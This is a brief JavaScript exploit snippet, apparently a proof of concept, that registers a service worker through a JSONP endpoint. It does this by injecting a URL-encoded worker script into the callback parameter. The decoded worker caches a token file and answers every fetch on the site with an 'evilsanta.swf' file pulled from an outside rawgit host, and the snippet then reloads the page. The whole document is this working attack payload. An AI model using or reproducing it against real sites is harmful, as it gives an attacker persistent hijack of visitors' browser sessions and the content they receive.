if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/token.jsonp?v=1&callback=this.addEventListener(%27install%27%2c+function(event)+%7b%0d%0a++event.waitUntil(%0d%0a++++caches.open(%27v1%27).then(function(cache)+%7b%0d%0a++++++return+cache.addAll(%5b%0d%0a++++++++%27%2ftoken.xml%27%0d%0a++++++%5d)%3b%0d%0a++++%7d)%0d%0a++)%3b%0d%0a%7d)%3b%0d%0a%0d%0athis.addEventListener(%27fetch%27%2c+function(event)+%7b%0d%0a+++event.respondWith(fetch(%27https%3a%2f%2frawgit.com%2fKawaHttp%2ftest1%2fmaster%2fevilsanta.swf%27).then(function(response)+%7b%0d%0a+++++return+response%3b%0d%0a+++%7d))%3b%0d%0a%7d)%3b%0d%0a%2f%2f', { scope: '/' }).then(function(reg) {
    
  }).catch(function(error) {
    // registration failed
    console.log('Registration failed with ' + error);
  });
};

location.reload();
